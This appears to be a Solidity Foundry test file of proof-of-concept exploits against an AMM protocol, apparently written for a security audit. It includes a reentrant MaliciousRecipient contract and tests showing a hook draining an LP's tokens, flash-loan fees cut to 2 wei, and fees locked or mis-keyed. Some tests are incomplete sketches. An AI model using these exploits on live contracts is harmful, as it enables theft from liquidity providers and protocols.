// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import 'forge-std/Test.sol';

contract MaliciousRecipient {
    address immutable amm;
    address immutable tokenFor;
    address immutable tokenFee;
    uint256 immutable claimAmount;
    bool reentered;

    constructor(address _amm, address _tf, address _tfe, uint256 _amt) {
        amm = _amm; tokenFor = _tf; tokenFee = _tfe; claimAmount = _amt;
    }

    // ERC-777 tokensReceived or ERC-20 hook callback
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (!reentered) {
            reentered = true;
            // Re-enter: reentrancy flags cleared at AMMModule:3190
            // collectHookFeesByHook falls through to _transferHookFeesByHook
            IModuleFeeCollection(amm).collectHookFeesByHook(
                tokenFor, tokenFee, address(this), claimAmount
            );
        }
    }
}

function testReentrancyFlagClearingDoS() public {
    // 1. Deploy ERC-777 fee token
    // 2. Deploy hook that queues collectHookFeesByHook during beforeSwap
    // 3. Set MaliciousRecipient as fee recipient
    // 4. Execute swap -> hook queues fee transfer
    // 5. _finalizeSwapCollectFundsAndDisburse calls executeQueuedHookFeesByHookTransfers
    // 6. _setReentrancyFlags(NO_FLAGS) at line 3190 clears SWAP_GUARD_FLAG
    // 7. SafeERC20.safeTransfer triggers tokensReceived on MaliciousRecipient
    // 8. MaliciousRecipient.collectHookFeesByHook -> direct _transferHookFeesByHook
    // 9. Queue loop continues, second _transferHookFeesByHook -> underflow -> revert
    // 10. Entire swap reverts
    vm.expectRevert(); // LBAMM__Underflow
    amm.singleSwap(swapOrder, poolId, exchangeFee, feeOnTop, hooks, data);
}

function testOutputPartialFillHookFeeOverpayment() public {
    // Setup:
    // - Create pool with SingleProviderPoolType that partial fills to 50%
    // - Token hook returns tokenOutTokenOutFee = 200 during beforeSwap
    // - User requests output swap for 1000 tokens (adjustedAmountSpecified = 1000)

    // Flow:
    // 1. _applySwapByOutputOutputFees: stores hookFee=200, amountOut=1000+200=1200
    // 2. Pool type swapByOutput: partial fill, actualAmountOut=600 (50% of 1200)
    // 3. amountOutAdjustment = 1200 - 600 = 600
    // 4. adjustedAmountSpecified = 1000 - 600 = 400 (user gets 400)
    // 5. Hook fees stored = 200 (FULL, not reduced)

    // Accounting: pool outputs 600 = hookFee(200) + userOutput(400). Balances check.
    // But fair allocation: hookFee should be ~100 (proportional 50% fill)
    // Hook extracted 200 from 600 actual output = 33.3% instead of 16.7%

    vm.prank(user);
    (uint256 amountIn, uint256 amountOut) = amm.singleSwap(
        outputSwapOrder, poolId, exchangeFee, feeOnTop, hooks, data
    );
    uint256 storedHookFees = amm.getHookFeesOwedByToken(address(tokenOut), address(tokenOut));
    assertEq(storedHookFees, 200, 'Hook fees NOT adjusted for 50% partial fill');
    assertEq(amountOut, 400, 'User absorbed entire shortfall');
}

function testCollectFeesHookDrainsLP() public {
    // 1. Pool has fees0=100 accrued for LP's position
    // 2. Token0 hook returns hookFee0=10000 during validateCollectFees
    // 3. LP calls collectFees with maxHookFee0 = type(uint256).max (common default)

    uint256 lpBalanceBefore = token0.balanceOf(provider);

    // LP has approved AMM for unlimited tokens (common pattern)
    vm.prank(provider);
    token0.approve(address(amm), type(uint256).max);

    vm.prank(provider);
    (uint256 fees0, uint256 fees1) = amm.collectFees(params, hooksData);

    uint256 lpBalanceAfter = token0.balanceOf(provider);

    // LP expected to RECEIVE 100 tokens
    // Instead: net = -100 + 10000 = +9900 (LP SENDS 9900 to AMM)
    assertLt(lpBalanceAfter, lpBalanceBefore, 'LP lost tokens during fee collection');
    assertEq(lpBalanceBefore - lpBalanceAfter, 9900, 'LP drained 9900 tokens');

    // Hook owner can claim the 10000
    uint256 hookFees = amm.getHookFeesOwedByToken(address(token0), address(token0));
    assertEq(hookFees, 10000, 'Hook extracted 10000 = 100 pool fees + 9900 from LP');
}

function testFlashLoanFeeBasisOverride() public {
    // Setup: token with hook that returns tokenFeeAmount=1 for flash loans
    // flashLoanBPS = 30 (0.3%)
    // loanAmount = 1_000_000e18

    // Expected fee (no hook): 1_000_000e18 * 30 / 10000 = 3_000e18
    // Actual fee (with hook): 1 + ceil(1 * 30 / 10000) = 1 + 1 = 2 wei

    uint256 ammBalanceBefore = token.balanceOf(address(amm));

    vm.prank(attacker);
    amm.flashLoan(FlashloanRequest({
        loanToken: address(token),
        loanAmount: 1_000_000e18,
        executor: address(flashBorrower),
        executorData: '',
        tokenHookData: ''
    }));

    uint256 ammBalanceAfter = token.balanceOf(address(amm));
    uint256 totalFee = ammBalanceAfter - ammBalanceBefore;

    // Fee should be ~3000e18 but is only 2 wei
    assertEq(totalFee, 2, 'Flash loan fee reduced to 2 wei');
    // Protocol lost 2999.999... tokens of expected fee revenue

    uint256 protocolFees = amm.getProtocolFees(address(token));
    assertEq(protocolFees, 1, 'Protocol received 1 wei instead of ~3000 tokens');
}

function testNonTokenHookFeeKeyMismatch() public {
    // Setup: Deploy a custom pool hook that returns cross-token fees
    // (hookFee0 denominated in token1, hookFee1 denominated in token0)
    // This exercises the key mismatch in _storeNonTokenHookFees

    // After liquidity operation with cross-token hook fees:
    // Fees stored at: hash(hook, hash(token0, token0)) via _storeNonTokenHookFees
    // But should be at: hash(hook, hash(token0, token1)) for cross-token fees

    // Same-token query works:
    uint256 sameTokenFees = amm.getHookFeesOwedByHook(
        address(hook), address(token0), address(token0)
    );
    assertGt(sameTokenFees, 0, 'Same-token query finds fees');

    // Cross-token query returns zero (key mismatch):
    uint256 crossTokenFees = amm.getHookFeesOwedByHook(
        address(hook), address(token0), address(token1)
    );
    assertEq(crossTokenFees, 0, 'Cross-token query returns 0 despite fees existing');

    // Hook tries to collect with cross-token params -> underflow revert
    vm.prank(address(hook));
    vm.expectRevert(); // LBAMM__Underflow at line 3131
    amm.collectHookFeesByHook(
        address(token0), address(token1), address(hook), sameTokenFees
    );
}

function testTokenSettingsChangeLocksFees() public {
    // 1. Token with hookA, HOOK_MANAGES_FEES_FLAG set
    // 2. Execute swaps → hookA accumulates 1000 fees
    assertEq(
        amm.getHookFeesOwedByHook(address(hookA), address(token), address(token)),
        1000
    );

    // 3. Admin changes hook to hookB
    vm.prank(tokenOwner);
    amm.setTokenSettings(address(token), address(hookB), newPackedSettings);

    // 4. hookA fees still in storage
    assertEq(
        amm.getHookFeesOwedByHook(address(hookA), address(token), address(token)),
        1000
    );

    // 5. If hookA is a stateless hook (no self-serve collection mechanism):
    // Nobody can call collectHookFeesByHook as hookA — funds permanently locked

    // 6. Even if hookA CAN collect, switching fee management mode orphans differently:
    // Switch from HOOK_MANAGES to TOKEN_MANAGES:
    // Old fees at hash(hookA, ...) — only hookA can claim via collectHookFeesByHook
    // New fees at hash(TOKEN_MANAGED_HOOK_FEE, ...) — token admin claims via collectHookFeesByToken
    // No migration between key spaces

    // 7. Verify AMM balance includes orphaned fees
    uint256 ammBalance = token.balanceOf(address(amm));
    uint256 reserves = getPoolReserves(poolId);
    uint256 feeBalances = getPoolFeeBalances(poolId);
    // ammBalance > reserves + feeBalances + claimableTokensOwed
    // Difference = orphaned hook fees
}
